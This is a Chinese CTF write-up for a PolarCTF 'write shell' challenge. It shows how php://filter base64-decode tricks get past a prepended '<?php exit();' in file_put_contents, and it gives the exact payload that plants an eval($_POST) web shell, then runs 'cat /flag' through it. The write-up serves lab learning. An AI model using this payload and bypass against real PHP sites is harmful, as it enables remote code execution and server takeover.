---
date: 2024-06-08
categories: 
    - PolarCTF
tag:
    - CTF
    - 
---

# 每日一题 —— [PolarCTF]写shell

> 题目地址：<https://www.polarctf.com/#/page/challenges>

<!-- more -->

打开题目就是很简单的一行代码，他会把你输入的 `content` 并上前面的 `<?php exit();` 一起写入到你指定的文件内。

观察到题目使用了 `file_put_contents` 函数，这个函数是支持 php 伪协议的，所以我们可以尝试使用 `php://filter` 来对我们输入的内容进行转换。预期结果就是，我们输入的内容可以把前面的 `exit` 函数给弄得失效，并且我们写入的 php 代码可以生效。

首先尝试这个 payload:
 
```
?filename=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=1.txt

POST:
content= ?<hp phpipfn(o;)
```

注意 `content` 和 `?` 之间的空格，这是因为 `UCS-2LE` 和 `UCS-2BE` 之间是两两组队互相交换的。所以为了保证转换成功进行，我们使用空格让前面的数据维持一个偶数个。

最后发现没有效果，在 `/1.txt` 中，所有数据被原原本本地写入了进去，也就是说前面的 `exit()` 被照常执行了。具体原因不清楚，没有办法，我们只能换一个方法。 

现在我们测试一下 base64 的方法。我们先把需要的东西进行 base64 编码写入进去测试一下：

```
?filename=php://filter/convert.base64-encode/resource=1.txt

POST:
content=<?phpinfo();
```

打开 `/1.txt` 可以看到数据被成功以 base64 的方式写入了进去。但是我们需要往里写入原始数据，所以我们预先要准备好一串 base64 编码好的 payload. 那么前面的函数怎么办呢。这里涉及一个 base64 的知识：base64 在转换的过程中是 3:4 的比例转换的，也就是说，对于一串原始文本，每三个字符一组被转换为一串 base64 ，其长度为 4. 因此在把 base64 解码的过程中，会四个字符一组转换。另外 base64 只支持 `[A-Z]` `[a-z` `/` `+` `=` 这些字符，其余的字符都是会被当作垃圾字符直接舍弃掉。

因此观察前面的代码 `<?php exit();` ，如果我们将其认为是一段 base64 编码的话，他会被省略无关字符，变为 `phpexit` ，一共七个字符。那么如果我们转换为原始文本，为了不影响后面的 payload 的转换，按照 4:3 的转换标准，我们需要补上一个合法字符凑齐 4 的倍数，然后再跟上已经编码好的 payload, 如下:

```bash
aPD9waHAgZXZhbCgkX1BPU1RbMV0pOw==   # <?php eval($_POST[1]);
```

熟悉这一段的都知道，`PD9w` 开头的就是 php 代码了。前面的 a 就会帮忙补足所需要的字节数。因此最终 payload ：

```bash
?filename=php://filter/convert.base64-decode/resource=1.php

POST
content=aPD9waHAgZXZhbCgkX1BPU1RbMV0pOw==
```

注意和之前的 payload 不同的是，我把输出的文件名改成了 `1.php` ，这样才可以成功解析我们要的 php 代码。另外 `base64` 后面跟着的是 `decode` ，因为这一次是我们预先输入了一串 base64，服务器帮我们解析成了原始文本。

最后，通过访问 `/1.php` ，无论是蚁剑连接，还是直接手搓 `POST: 1=system('cat /flag');` 都没问题了。
